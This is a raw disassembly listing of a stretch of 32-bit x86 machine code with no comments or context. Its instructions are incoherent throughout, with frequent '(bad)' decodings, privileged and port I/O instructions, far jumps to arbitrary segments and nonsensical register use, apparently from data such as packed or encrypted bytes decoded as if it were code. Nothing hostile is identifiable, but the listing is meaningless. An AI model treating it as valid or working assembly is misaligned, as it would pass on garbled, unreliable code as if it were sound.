  4164f7:	xchg   edi,eax
  4164f8:	and    BYTE PTR [edx+0x73],dl
  4164fb:	dec    edi
  4164fc:	add    al,dh
  4164fe:	mov    DWORD PTR ds:0xa92cb70f,esp
  416504:	mov    bl,0xc8
  416506:	add    al,BYTE PTR [esi+eiz*4]
  416509:	cli    
  41650a:	test   DWORD PTR [edx],edi
  41650c:	mov    esi,0x45071e8d
  416511:	scas   eax,DWORD PTR es:[edi]
  416512:	arpl   WORD PTR [edi],si
  416514:	mov    eax,ds:0xb0e0922a
  416519:	inc    esi
  41651a:	pop    edi
  41651b:	push   eax
  41651c:	mov    ecx,0x9f37de61
  416521:	iret   
  416522:	push   ss
  416523:	daa    
  416524:	popa   
  416525:	imul   edi,DWORD PTR gs:[ebx-0x2ae4bf26],0x7ca8b67d
  416530:	vmwrite ebx,edi
  416533:	fcmovnb st,st(3)
  416535:	ja     0x416501
  416537:	jo     0x41654e
  416539:	rcr    DWORD PTR ds:0xc38970db,cl
  41653f:	xor    eax,0xa1437479
  416544:	jle    0x416595
  416546:	fdivr  DWORD PTR [ecx-0x280f64dc]
  41654c:	sub    BYTE PTR [ebx+0x48],bh
  41654f:	shr    DWORD PTR [esi-0x23ff119b],0x5d
  416556:	jnp    0x416504
  416558:	data16 sbb BYTE PTR [edi-0x52430288],ah
  41655f:	pop    eax
  416560:	imul   eax,eax,0x0
  416563:	jno    0x41658f
  416565:	xor    DWORD PTR [esi],ecx
  416567:	sbb    DWORD PTR [ecx],ebx
  416569:	jecxz  0x416549
  41656b:	fdivr  st(0),st
  41656d:	leave  
  41656e:	sbb    DWORD PTR [ebp-0x720e531e],edi
  416574:	lods   eax,DWORD PTR ds:[esi]
  416575:	int    0x8d
  416577:	lea    eax,[edi+0x2]
  41657a:	jbe    0x41653e
  41657c:	mov    eax,0x82f4e522
  416581:	mov    esp,0xe059ab8f
  416586:	mov    bh,0x17
  416588:	and    ch,BYTE PTR [esp+eiz*8]
  41658b:	cmp    al,0xb6
  41658d:	pop    edi
  41658e:	jge    0x41652b
  416590:	push   0xffffffdd
  416592:	iret   
  416593:	or     cl,BYTE PTR [esi]
  416595:	test   al,0x8a
  416597:	pop    ebp
  416598:	xchg   esi,eax
  416599:	mov    ds:0x6073a93d,al
  41659e:	fild   QWORD PTR [edi+esi*4]
  4165a1:	scas   al,BYTE PTR es:[edi]
  4165a2:	cmp    DWORD PTR [edx],esi
  4165a4:	or     cl,BYTE PTR [ebp-0x4a97f787]
  4165aa:	pop    ss
  4165ab:	test   eax,0xf0c8c454
  4165b0:	inc    eax
  4165b1:	out    dx,al
  4165b2:	inc    edx
  4165b3:	xor    BYTE PTR gs:[esi-0x6e],dh
  4165b7:	inc    esp
  4165b8:	imul   ebx,ebp,0x127b912f
  4165be:	mov    dl,0xd1
  4165c0:	repnz or esi,edi
  4165c3:	push   esi
  4165c4:	cli    
  4165c5:	test   BYTE PTR [eax+0x6],al
  4165c8:	mov    eax,ds:0xdc2b5743
  4165cd:	jns    0x41656e
  4165cf:	out    dx,eax
  4165d0:	xchg   esi,eax
  4165d1:	or     DWORD PTR [ebx+0x53],0xffffff9a
  4165d5:	mov    edi,DWORD PTR [edi-0x44]
  4165d8:	lods   al,BYTE PTR ds:[esi]
  4165d9:	bound  esi,QWORD PTR [ebp+0x52e58783]
  4165df:	add    eax,0xdcf5741
  4165e4:	pop    eax
  4165e5:	ins    DWORD PTR es:[edi],dx
  4165e6:	push   esi
  4165e7:	popa   
  4165e8:	(bad)  
  4165e9:	test   eax,0x83c55f45
  4165ee:	push   ebx
  4165ef:	xor    ebp,DWORD PTR [esi]
  4165f1:	call   0xd31fec67
  4165f6:	cmp    DWORD PTR [ecx+0x6b83b4bd],0x41
  4165fd:	jns    0x4165a2
  4165ff:	mov    ds:0xc999db2e,eax
  416604:	adc    esp,DWORD PTR [edx+0x2ae6b013]
  41660a:	ror    BYTE PTR [eax+0x4c],1
  41660d:	mov    ch,0x9f
  41660f:	sbb    DWORD PTR [ecx],edi
  416611:	sbb    BYTE PTR [eax-0x56],cl
  416614:	clc    
  416615:	and    ah,ch
  416617:	lahf   
  416618:	mov    ebx,0x1f8fc64d
  41661d:	and    al,al
  41661f:	popf   
  416620:	aas    
  416621:	xchg   ecx,eax
  416622:	test   eax,0x5d927738
  416627:	stos   BYTE PTR es:[edi],al
  416628:	mov    ss,WORD PTR [edx]
  41662a:	push   edi
  41662b:	dec    esp
  41662c:	fadd   DWORD PTR [edx-0x41]
  41662f:	jae    0x41669b
  416631:	xchg   DWORD PTR ds:0xe03c0502,esp
  416637:	lds    eax,FWORD PTR [edi-0x45414bdc]
  41663d:	fild   DWORD PTR [edi+0x1f]
  416640:	sbb    dh,0x4c
  416643:	mov    dh,0x5f
  416645:	test   eax,0xb43e746
  41664a:	xchg   ebp,eax
  41664b:	inc    esi
  41664c:	cmc    
  41664d:	aam    0xaa
  41664f:	shr    BYTE PTR [edx-0x33c720c7],1
  416655:	icebp  
  416656:	adc    al,0x2f
  416658:	nop
  416659:	inc    esp
  41665a:	ss cmc 
  41665c:	mov    esi,0xfa4f7317
  416661:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416662:	test   al,0xaf
  416664:	adc    esi,DWORD PTR [edi-0x4a]
  416667:	dec    ebp
  416668:	xchg   esi,eax
  416669:	cdq    
  41666a:	add    BYTE PTR [edi+0x24],cl
  41666d:	mov    ecx,0x9f63b3a
  416672:	cmp    bh,dl
  416674:	and    dl,BYTE PTR [bx+si]
  416677:	and    eax,0xa8cbc95b
  41667c:	adc    edi,DWORD PTR [ebp+0x3d]
  41667f:	adc    al,0xc2
  416681:	inc    esp
  416682:	cmp    eax,0xd0c9f104
  416687:	xchg   ebx,eax
  416688:	fadd   DWORD PTR [esi]
  41668a:	retf   
  41668b:	mov    edx,0x43de51ca
  416690:	mov    WORD PTR [esp+eax*1+0xb],?
  416694:	ds inc edx
  416696:	mov    bh,BYTE PTR [edx]
  416698:	out    dx,al
  416699:	jle    0x416696
  41669b:	push   esp
  41669c:	outs   dx,BYTE PTR ds:[esi]
  41669d:	scas   al,BYTE PTR es:[edi]
  41669e:	add    cl,bl
  4166a0:	pushf  
  4166a1:	push   0xbd3a7e76
  4166a6:	fsub   DWORD PTR [eax+0x6f]
  4166a9:	fisub  WORD PTR ss:[edi-0x598053af]
  4166b0:	jnp    0x416707
  4166b2:	ffreep st(2)
  4166b4:	xor    BYTE PTR [eax+0x37],dh
  4166b7:	fsubrp st(0),st
  4166b9:	outs   dx,DWORD PTR ds:[esi]
  4166ba:	jmp    0xcb69:0x50dbc707
  4166c1:	jnp    0x4166a9
  4166c3:	adc    dh,0xab
  4166c6:	pop    edi
  4166c7:	(bad)  
  4166c8:	loope  0x416714
  4166ca:	sbb    eax,0x2b15052b
  4166cf:	push   0x94e51e58
  4166d4:	mov    eax,0xc3cb8ec7
  4166d9:	repnz adc esp,DWORD PTR [ebp-0x3f]
  4166dd:	fidiv  DWORD PTR [edx-0x21]
  4166e0:	pop    ebp
  4166e1:	xchg   edi,eax
  4166e2:	je     0x8111c2c
  4166e8:	into   
  4166e9:	out    dx,eax
  4166ea:	mov    DWORD PTR [ebx+eiz*8],ebp
  4166ed:	mov    ds:0xe54844f6,al
  4166f2:	aam    0x28
  4166f4:	dec    ebp
  4166f5:	xor    eax,0x3baf40c
  4166fa:	(bad)  
  4166fb:	and    BYTE PTR [ecx-0x6312d995],bl
  416701:	(bad)  
  416702:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416703:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416704:	popa   
  416705:	sbb    DWORD PTR [edi],ebx
  416707:	push   0x98dacd5c
  41670c:	mov    bl,0x7a
  41670e:	push   0x4d
  416710:	ins    BYTE PTR es:[edi],dx
  416711:	dec    edi
  416712:	sub    DWORD PTR [ebp-0x148e6242],0xffffffa0
  416719:	add    bl,al
  41671b:	fs mov esi,0x72249240
  416721:	pop    ss
  416722:	mov    dh,0xbf
  416724:	int    0x3c
  416726:	mov    ch,0x87
  416728:	js     0x41671e
  41672a:	aad    0xe6
  41672c:	or     DWORD PTR [ebp-0x53c8ba71],ebp
  416732:	mov    ch,0x1b
  416734:	jl     0x416722
  416736:	aam    0x4d
  416738:	mov    dh,ah
  41673a:	push   0xffffffd7
  41673c:	xchg   esi,eax
  41673d:	aas    
  41673e:	mov    ds,eax
  416740:	xchg   edx,eax
  416741:	outs   dx,BYTE PTR ds:[esi]
  416742:	jns    0x416766
  416744:	and    dl,ah
  416746:	mov    ch,BYTE PTR [edi-0xa4e4ec2]
  41674c:	inc    edi
  41674d:	enter  0xad4a,0xdb
  416751:	sbb    eax,0x8df1bc86
  416756:	retf   
  416757:	call   0xe551:0x8de2cfac
  41675e:	cdq    
  41675f:	push   0x3d4d2201
  416764:	and    al,0x5
  416766:	xchg   edx,eax
  416767:	jnp    0x416727
  416769:	add    al,0x76
  41676b:	pushf  
  41676c:	ins    BYTE PTR es:[edi],dx
  41676d:	rol    ah,1
  41676f:	jno    0x4167c9
  416771:	outs   dx,DWORD PTR ds:[esi]
  416772:	daa    
  416773:	xor    ebx,DWORD PTR [ebx+eiz*8-0x1f]
  416777:	fist   DWORD PTR [ebp+0x18cd5e82]
  41677d:	aaa    
  41677e:	xchg   ebx,eax
  41677f:	xchg   ebp,eax
  416780:	jmp    0x41677a
  416782:	push   0x27
  416784:	cld    
  416785:	sbb    bh,BYTE PTR [edx+0x3cac2f52]
  41678b:	pop    edx
  41678c:	jns    0x4167bb
  41678e:	fs stos DWORD PTR es:[edi],eax
  416790:	out    0x30,eax
  416792:	and    BYTE PTR [edx],dh
  416794:	inc    ecx
  416795:	mov    al,ds:0xb6f6b4fd
  41679a:	jmp    0x44df:0x59bf0526
  4167a1:	xchg   ebx,eax
  4167a2:	pop    ebx
  4167a3:	rcl    DWORD PTR [eax-0x6a5a1b4c],0xe7
  4167aa:	mov    dl,0xbc
  4167ac:	mov    al,ds:0x393a77d7
  4167b1:	push   ebx
  4167b2:	repnz imul esp,esp,0x52
  4167b6:	or     edi,esp
  4167b8:	(bad)  
  4167ba:	dec    ebx
  4167bb:	aad    0x38
  4167bd:	(bad)  [edi+esi*8-0x44]
  4167c1:	xchg   edx,eax
  4167c2:	xor    BYTE PTR [edx],bl
  4167c4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4167c5:	cld    
  4167c6:	sub    DWORD PTR [eax-0x69c0f63f],0xa5b994e0
  4167d0:	mov    bh,0xa
  4167d2:	aam    0x33
  4167d4:	pop    esp
  4167d5:	mov    WORD PTR [ebp-0x6e],?
  4167d8:	adc    al,0xae
  4167da:	jecxz  0x4167ee
  4167dc:	adc    ebx,edi
  4167de:	push   ecx
  4167df:	lock bound esi,QWORD PTR [edi-0x44191494]
  4167e6:	add    al,0x80
  4167e8:	or     BYTE PTR [ebp-0x7d8f8609],bh
  4167ee:	int3   
  4167ef:	retf   
  4167f0:	jns    0x4167f9
  4167f2:	inc    ecx
  4167f3:	fbstp  TBYTE PTR [ebp+0x69df6702]
  4167f9:	push   ds
  4167fa:	test   BYTE PTR [eax+esi*8+0x6b645ed2],dh
  416801:	in     eax,0xa2
  416803:	dec    DWORD PTR [eax+0x1271f6dc]
  416809:	enter  0xd470,0x7
  41680d:	push   0xfb10f806
  416812:	fistp  DWORD PTR [edx]
  416814:	xor    al,0x1e
  416816:	mov    dh,0xd3
  416818:	ins    BYTE PTR es:[edi],dx
  416819:	adc    ch,BYTE PTR [edx-0x4293c1aa]
  41681f:	sti    
  416820:	out    0xf0,al
  416822:	sub    ebx,DWORD PTR [edi-0x72eb30de]
  416828:	arpl   WORD PTR [ecx],dx
  41682a:	cwde   
  41682b:	add    eax,0x1ffd64cf
  416830:	push   eax
  416831:	repnz int3 
  416833:	es xchg ebx,eax
  416835:	mov    DWORD PTR [ebp+ebp*4+0x3a],eax
  416839:	inc    ebp
  41683a:	sti    
  41683b:	dec    esi
  41683c:	xchg   ebp,eax
  41683d:	xor    al,0x28
  41683f:	jnp    0x4168b7
  416841:	add    DWORD PTR [eax+0x1321c4ec],0xffffffea
  416848:	jg     0x41685e
  41684a:	mov    bh,0x7c
  41684c:	mov    eax,ds:0x4c2edc1
  416851:	std    
  416852:	and    ch,al
  416854:	outs   dx,DWORD PTR ds:[esi]
  416855:	and    al,0x65
  416857:	inc    edx
  416858:	cmp    eax,0xcd59588d
  41685d:	jmp    0xbf2c:0xf22c5df4
  416864:	iret   
  416865:	cli    
  416866:	(bad)  
  416867:	pop    ecx
  416868:	retf   0x99b4
  41686b:	fidiv  DWORD PTR [ebx-0x51ac0754]
  416871:	sbb    eax,0xc6625b93
  416876:	xchg   ecx,eax
  416877:	aaa    
  416878:	mov    eax,0xceb3b2cf
  41687d:	mov    edx,0xfa6516ef
  416882:	mov    dh,BYTE PTR [edi-0x5c]
  416885:	mov    cl,0x21
  416887:	ins    BYTE PTR es:[edi],dx
  416888:	jo     0x4168c5
  41688a:	adc    BYTE PTR [ecx-0x2f54afb4],ch
  416890:	pusha  
  416891:	cld    
  416892:	mov    ebp,0x34982630
  416897:	mov    dh,0x95
  416899:	lock adc edx,0xcad6da17
  4168a0:	imul   eax,DWORD PTR [eax],0xea06df99
  4168a6:	pop    ebp
  4168a7:	pop    es
  4168a8:	xchg   esi,eax
  4168a9:	cmc    
  4168aa:	mov    WORD PTR [edx-0x6ce5a781],?
  4168b0:	mov    dl,0xd4
  4168b2:	fisttp QWORD PTR [ebx+0xe]
  4168b5:	adc    ecx,DWORD PTR [ebp-0x2a]
  4168b8:	cmp    BYTE PTR [edx],ch
  4168ba:	stos   DWORD PTR es:[edi],eax
  4168bb:	mov    esp,0x6fdfacb8
  4168c0:	arpl   WORD PTR [ecx],dx
  4168c2:	and    esi,DWORD PTR ds:0xf14dfb37
  4168c8:	jns    0x416851
  4168ca:	push   edi
  4168cb:	or     DWORD PTR [ebx-0x4],ebp
  4168ce:	mov    ah,0x15
  4168d0:	sahf   
  4168d1:	test   DWORD PTR [edx+0x462ec05d],ebp
  4168d7:	call   0x5afe822f
  4168dc:	fs dec esp
  4168de:	call   0x1bb6:0x55877c78
  4168e5:	inc    ebx
  4168e6:	pop    edi
  4168e7:	lods   al,BYTE PTR ds:[esi]
  4168e8:	sbb    DWORD PTR [eax-0x13c1a4e9],edx
  4168ee:	or     bh,BYTE PTR [edi]
  4168f0:	jns    0x4168cb
  4168f2:	push   cs
  4168f3:	fisttp WORD PTR [edx]
  4168f5:	add    DWORD PTR [edi+0x71f03643],ecx
  4168fb:	push   cs
  4168fc:	pop    ebp
  4168fd:	mov    bh,0x98
  4168ff:	enter  0xb3d0,0x34
  416903:	add    edx,DWORD PTR [ebp-0x445dd2dc]
  416909:	push   eax
  41690a:	adc    DWORD PTR [ebp+0x517a10cc],0x35780058
  416914:	inc    esp
  416915:	xor    edx,DWORD PTR [edi+0x19e408f7]
  41691b:	pop    ebx
  41691c:	std    
  41691d:	stc    
  41691e:	or     BYTE PTR [esi+0x6f],al
  416921:	sbb    esi,esp
  416923:	fistp  QWORD PTR [ebp+0x8]
  416926:	clc    
  416927:	adc    DWORD PTR ds:0x3bdd031c,edx
  41692d:	add    bh,BYTE PTR [esi+ecx*1-0x70543f0e]
  416934:	jae    0x416911
  416936:	adc    BYTE PTR [eax-0x297c0521],ch
  41693c:	pop    ss
  41693d:	call   0x72e6:0xd07c27cd
  416944:	or     edx,ebx
  416946:	mov    ds:0xda19e161,eax
  41694b:	jmp    0x8915a5dd
  416950:	rcl    DWORD PTR ds:0x8589536e,cl
  416956:	xor    ah,bh
  416958:	addr16 add al,0xb2
  41695b:	jecxz  0x4168ec
  41695d:	outs   dx,BYTE PTR ds:[esi]
  41695e:	ror    BYTE PTR [esi+0x3d9ab8dc],cl
  416964:	xor    DWORD PTR [edi],ebx
  416966:	xchg   esi,eax
  416967:	mov    edx,DWORD PTR [edi+ebp*8-0xf]
  41696b:	mov    esp,DWORD PTR [ecx+0x66e28219]
  416971:	stos   DWORD PTR es:[edi],eax
  416972:	pop    es
  416973:	outs   dx,BYTE PTR ds:[esi]
  416974:	xchg   edx,eax
  416976:	push   0x13
  416978:	cdq    
  416979:	lds    ecx,FWORD PTR [ecx]
  41697b:	out    dx,eax
  41697c:	(bad)
  416980:	jo     0x41699b
  416982:	or     ebx,ebx
  416984:	add    ebp,ebx
  416986:	ror    DWORD PTR [edx+0x70],0xee
  41698a:	test   BYTE PTR [eax-0x29],dl
  41698d:	mov    esi,0x115fefd
  416992:	test   DWORD PTR [edx+0x51],0xef023348
  416999:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41699a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41699b:	(bad)  ds:0xaae8
  4169a0:	jo     0x416947
  4169a2:	xlat   BYTE PTR ds:[ebx]
  4169a3:	ins    DWORD PTR es:[edi],dx
  4169a4:	jmp    0xb2c1:0xdc8aa527
  4169ab:	jp     0x416948
  4169ad:	xchg   ebx,eax
  4169ae:	dec    ebp
  4169af:	push   0xa0fdbd0c
  4169b4:	sti    
  4169b5:	fnstsw WORD PTR [ebp-0x625f6f7d]
  4169bb:	pause  
  4169bd:	sbb    ebx,ebp
  4169bf:	push   esp
  4169c0:	xor    eax,0xf6dbc168
  4169c5:	mov    BYTE PTR [ecx],ah
  4169c7:	push   ebp
  4169c8:	mov    ch,BYTE PTR [ebx+0x5e]
  4169cb:	stos   BYTE PTR es:[edi],al
  4169cc:	inc    ebx
  4169cd:	pop    esi
  4169ce:	popa   
  4169cf:	retf   0xe55a
  4169d2:	and    ch,BYTE PTR [ebp-0x45]
  4169d5:	rep lods eax,DWORD PTR ds:[esi]
  4169d7:	(bad)  
  4169d8:	pop    ss
  4169d9:	inc    DWORD PTR [eax-0x2e]
  4169dc:	mov    dl,0xd1
  4169de:	or     al,0x2c
  4169e0:	stos   BYTE PTR es:[edi],al
  4169e1:	sbb    edi,esp
  4169e3:	aad    0x7e
  4169e5:	and    ah,cl
  4169e7:	adc    eax,0xda1034ff
  4169ec:	in     eax,dx
  4169ed:	mov    esi,0x98654568
  4169f2:	popa   
  4169f3:	or     DWORD PTR [ecx+edi*8],esp
  4169f6:	mov    ebp,0xb26be1b3
  4169fb:	retf   
  4169fc:	fdivp  st(7),st
  4169fe:	outs   dx,DWORD PTR ds:[esi]
  4169ff:	(bad)  
  416a01:	push   ebx
  416a02:	sub    al,0x8c
  416a04:	mov    al,0x17
  416a06:	int3   
  416a07:	arpl   WORD PTR [ebx],bx
  416a09:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416a0a:	js     0x4169fd
  416a0c:	daa    
  416a0d:	(bad)  
  416a0e:	int    0xe6
  416a10:	repz jno 0x416a85
  416a13:	xchg   esp,eax
  416a14:	in     eax,0xc
  416a16:	fiadd  WORD PTR [ecx-0x63]
  416a19:	push   es
  416a1a:	adc    BYTE PTR [eax],ah
  416a1c:	test   eax,0xde1c77ca
  416a21:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416a22:	stc    
  416a23:	sbb    eax,0x92618c40
  416a28:	push   ss
  416a29:	pop    ebx
  416a2a:	aas    
  416a2b:	aad    0x80
  416a2d:	adc    bh,BYTE PTR [edi-0x1b650f5d]
  416a33:	bound  esi,QWORD PTR [ebx-0xd5ba0f0]
  416a39:	xor    edx,edx
  416a3b:	sub    al,0xef
  416a3d:	out    0x9a,al
  416a3f:	cmp    ebp,esp
  416a41:	ret    
  416a42:	test   DWORD PTR [esi+0x72310968],eax
  416a48:	inc    ecx
  416a49:	inc    edx
  416a4a:	neg    BYTE PTR [edx+ebx*4-0x61]
  416a4e:	inc    ebp
  416a4f:	loop   0x416ab2
  416a51:	jns    0x4169da
  416a53:	inc    edi
  416a54:	and    dl,al
  416a56:	or     bh,BYTE PTR [edi+0x15]
  416a59:	pop    ds
  416a5a:	xchg   BYTE PTR [edi+0x4e],dl
  416a5d:	add    ch,BYTE PTR [edi-0x488ff84b]
  416a63:	adc    al,0x4d
  416a65:	addr16 pop edi
  416a67:	ja     0x416a44
  416a69:	mov    edx,esi
  416a6b:	lods   al,BYTE PTR ds:[esi]
  416a6c:	mov    BYTE PTR [edx+eax*1+0x545ac313],ah
  416a73:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416a74:	hlt    
  416a75:	jmp    0xf7fd59f3
  416a7a:	and    al,0xf0
  416a7c:	mov    esp,0xc0aedc2b
  416a81:	ret    
  416a82:	fist   DWORD PTR [eax-0x50]
  416a85:	in     al,0x47
  416a87:	repnz fist DWORD PTR [edi]
  416a8a:	aad    0x40
  416a8c:	mov    ds:0x1b667b9c,eax
  416a91:	fmul   QWORD PTR [ecx]
  416a93:	dec    edx
  416a94:	cli    
  416a95:	sti    
  416a96:	or     al,0xba
  416a98:	dec    edi
  416a99:	inc    esp
  416a9a:	dec    esi
  416a9b:	xlat   BYTE PTR ds:[ebx]
  416a9c:	sbb    BYTE PTR [ebx],bl
  416a9e:	cmc    
  416a9f:	leave  
  416aa0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416aa1:	sub    BYTE PTR [eax+0x28],bh
  416aa4:	mov    al,dh
  416aa6:	cli    
  416aa7:	js     0x416a93
  416aa9:	(bad)  
  416aaa:	loope  0x416a81
  416aac:	or     BYTE PTR [ebp-0x1439d42d],dh
  416ab2:	mov    ecx,0xe2e7f1bb
  416ab7:	cli    
  416ab8:	imul   edi,DWORD PTR [ebp-0x2512fa1f],0xfffffffa
  416abf:	(bad)  
  416ac0:	fist   DWORD PTR [ebp-0x60e5e371]
  416ac6:	out    dx,al
  416ac7:	xor    al,0xa5
  416ac9:	mov    eax,ds:0x3aaa6bf0
  416ace:	xchg   esp,eax
  416acf:	jb     0x416ab7
  416ad1:	xchg   edi,eax
  416ad2:	sti    
  416ad3:	repz mov edi,0x1881bdea
  416ad9:	mov    ds:0x23654538,al
  416ade:	cld    
  416adf:	sbb    al,0x67
  416ae1:	fcomp  st(6)
  416ae3:	ja     0x416a6c
  416ae5:	sub    edi,ecx
  416ae7:	ins    DWORD PTR es:[edi],dx
  416ae8:	mov    eax,0x6902542e
  416aed:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416aee:	cmp    eax,0xf614e25b
  416af3:	clc    
  416af4:	sub    ah,BYTE PTR [esi-0x3e]
  416af7:	in     eax,0x38
  416af9:	stc    
  416afa:	xor    eax,DWORD PTR [esi-0x56]
  416afd:	and    bh,BYTE PTR [ebx-0x6dc0212a]
  416b03:	push   esi
  416b04:	enter  0xf317,0x40
  416b08:	hlt    
  416b09:	fld    DWORD PTR [eax-0x1c]
  416b0c:	adc    cl,BYTE PTR [edx-0x31184b55]
  416b12:	daa    
  416b13:	mov    al,ds:0x33cf3b93
  416b18:	adc    DWORD PTR [eax-0x5a55de79],edi
  416b1e:	sbb    esi,ebp
  416b20:	std    
  416b21:	or     esi,edi
  416b23:	jne    0x416aac
  416b25:	or     cl,ch
  416b27:	imul   ebx,DWORD PTR [edx+0x8],0x409adecd
  416b2e:	jo     0x416b83
  416b30:	and    DWORD PTR [ecx+0x7e22e36d],esi
  416b36:	mov    ebp,0x4cc2b1c6
  416b3b:	int    0xf5
  416b3d:	(bad)  
  416b3e:	gs mov dl,0x5c
  416b41:	inc    esi
  416b42:	in     al,dx
  416b43:	out    dx,al
  416b44:	jge    0x416b78
  416b46:	test   dh,bl
  416b48:	jge    0x416ba9
  416b4a:	xchg   ebp,eax
  416b4b:	js     0x416b35
  416b4d:	mov    esi,0xa14a9047
  416b52:	mov    eax,ds:0xffab49d3
  416b57:	jmp    0x19d6:0x9dc6f2d6
  416b5e:	cmps   BYTE PTR es:[esi],BYTE PTR es:[edi]
  416b60:	in     eax,0x94
  416b62:	shr    BYTE PTR [ebp-0x1f],1
  416b65:	repnz mov ecx,0x219c2f35
  416b6b:	cmc    
  416b6c:	cmp    eax,DWORD PTR [edi]
  416b6e:	or     eax,0xf9ebeb1
  416b73:	jnp    0x416bbb
  416b75:	add    ah,dh
  416b77:	jg     0x416b8c
  416b79:	jae    0x416b9f
  416b7b:	ds js  0x416bb9
  416b7e:	fisubr DWORD PTR [esi-0x2f]
  416b81:	sub    esp,DWORD PTR [ebp+ebx*1-0x7a41ea8f]
  416b88:	fidiv  DWORD PTR [edx]
  416b8a:	sbb    DWORD PTR [ecx+esi*8+0x791c7ad4],esi
  416b91:	fistp  DWORD PTR [esp+esi*1]
  416b94:	enter  0x8fba,0xa0
  416b98:	pop    es
  416b99:	out    dx,eax
  416b9a:	out    0x49,al
  416b9c:	mov    ah,0x67
  416b9e:	mov    al,ds:0xc4ba633b
  416ba3:	mov    ah,0x8c
  416ba5:	sub    esp,0xffffffd7
  416ba8:	rcl    DWORD PTR [esp+eiz*2+0xb981590],0x6a
  416bb0:	dec    edi
  416bb1:	lahf   
  416bb2:	add    ebx,DWORD PTR [esi-0x445afcc]
  416bb8:	and    bh,0x83
  416bbb:	test   al,0xdb
  416bbd:	in     eax,dx
  416bbe:	or     al,0x6a
  416bc0:	mov    ds:0x28ec2de1,eax
  416bc5:	and    ebp,DWORD PTR [edi+0x39]
  416bc8:	ret    0xf3bb
  416bcb:	mov    esi,0xff3178a3
  416bd0:	jmp    0x416c32
  416bd2:	retf   
  416bd3:	push   esi
  416bd4:	test   BYTE PTR [ebp-0x3e7e4dad],dh
  416bda:	inc    ecx
  416bdb:	popa   
  416bdc:	out    dx,eax
  416bdd:	es jns 0x416c33
  416be0:	or     eax,0xdde98b6
  416be5:	jne    0x416bce
  416be7:	push   ds
  416be8:	add    DWORD PTR [eax+ebx*2],ecx
  416beb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416bec:	cld    
  416bed:	(bad)  [eax-0x70a51eb6]
  416bf3:	rcl    ch,1
  416bf5:	cmp    al,0x2
  416bf7:	dec    edi
  416bf8:	movq   QWORD PTR [eax+0x791674ba],mm3
  416bff:	pop    ebp
  416c00:	(bad)  
  416c01:	push   esp
  416c02:	add    BYTE PTR [edx+0x45],0x78
  416c06:	mov    eax,ds:0x6173041e
  416c0b:	pop    ebx
  416c0c:	xchg   esp,eax
  416c0d:	add    al,0xdd
  416c0f:	test   eax,0xeb794c72
  416c14:	in     al,dx
  416c15:	fcom   QWORD PTR [edx-0x51c166bf]
  416c1b:	cmp    BYTE PTR [edi+edi*2+0x472006c8],0xd8
  416c23:	jae    0x416c05
  416c25:	mov    edi,DWORD PTR [eax]
  416c27:	not    DWORD PTR [ebx]
  416c29:	sbb    BYTE PTR [ecx],bl
  416c2b:	mov    ecx,0x3db166b0
  416c30:	div    DWORD PTR [bx+si]
  416c33:	pusha  
  416c34:	jbe    0x416c15
  416c36:	push   ecx
  416c37:	aam    0x43
  416c39:	and    eax,0x1371a1c2
  416c3e:	ret    0x4870
  416c41:	jl     0x416bfe
  416c43:	repz and eax,0x2f42d3e1
  416c49:	pop    edi
  416c4a:	inc    eax
  416c4b:	mov    ebp,0x9b2b5fbc
  416c50:	push   ss
  416c51:	jne    0x416c7a
  416c53:	jo     0x416c0e
  416c55:	inc    eax
  416c56:	pop    ebp
  416c57:	mov    ebp,0x2cb3460
  416c5c:	in     eax,dx
  416c5d:	test   al,0xa2
  416c5f:	jbe    0x416be6
  416c61:	cmp    al,0x2c
  416c63:	xor    ah,BYTE PTR [ecx+0xa]
  416c66:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416c67:	inc    edi
  416c68:	mov    esi,0x90e9fe6a
  416c6d:	mov    ds:0x28b9d5b8,al
  416c72:	ficomp WORD PTR [ecx+edx*1+0x3ed14a3d]
  416c79:	aad    0x94
  416c7b:	sti    
  416c7c:	pop    ss
  416c7d:	cs sbb ch,ch
  416c80:	add    DWORD PTR [ebx-0x29],ebx
  416c83:	out    dx,eax
  416c84:	lods   eax,DWORD PTR ds:[esi]
  416c85:	sbb    ebp,ebp
  416c87:	mov    bl,0xd0
  416c89:	js     0x416cb7
  416c8b:	(bad)  [ecx-0x72793ce]
  416c91:	pop    esi
  416c92:	xchg   esp,eax
  416c93:	jno    0x416cf1
  416c95:	mov    WORD PTR [ebp+0x0],fs
  416c98:	call   0x1a35:0x58925d2b
  416c9f:	xchg   ebx,eax
  416ca0:	xchg   esi,eax
  416ca1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416ca2:	aam    0x73
  416ca4:	(bad)  
  416ca5:	scas   al,BYTE PTR es:[edi]
  416ca6:	jl     0x416c97
  416ca8:	jne    0x416c8f
  416caa:	sub    ebp,DWORD PTR [ecx+0x1691723c]
  416cb0:	jbe    0x416c32
  416cb2:	jmp    0x491f75f5
  416cb7:	mov    bh,BYTE PTR [ebx-0x3c]
  416cba:	ret    
  416cbb:	and    ebx,DWORD PTR [edi+0x4276c9ce]
  416cc1:	mov    eax,ds:0xa476cc9f
  416cc6:	out    0x94,al
  416cc8:	mov    bh,0x7e
  416cca:	mov    esi,esi
  416ccc:	rcl    eax,1
  416cce:	test   ecx,esp
  416cd0:	pop    edi
  416cd1:	out    dx,al
  416cd2:	frstor [edi]
  416cd4:	and    al,0xfa
  416cd6:	pusha  
  416cd7:	fiadd  WORD PTR [ecx+eiz*1+0x636e9925]
  416cde:	adc    BYTE PTR [edi],bh
  416ce0:	xchg   edi,eax
  416ce1:	mov    bl,0xf6
  416ce3:	(bad)  
  416ce4:	and    bh,al
  416ce6:	lds    eax,FWORD PTR [esi+ebx*4+0x7e]
  416cea:	or     BYTE PTR [eax+0xc],dh
  416ced:	or     BYTE PTR [ecx-0x54],cl
  416cf0:	loopne 0x416ca0
  416cf2:	pop    ebx
  416cf3:	sbb    BYTE PTR [ebx],ch
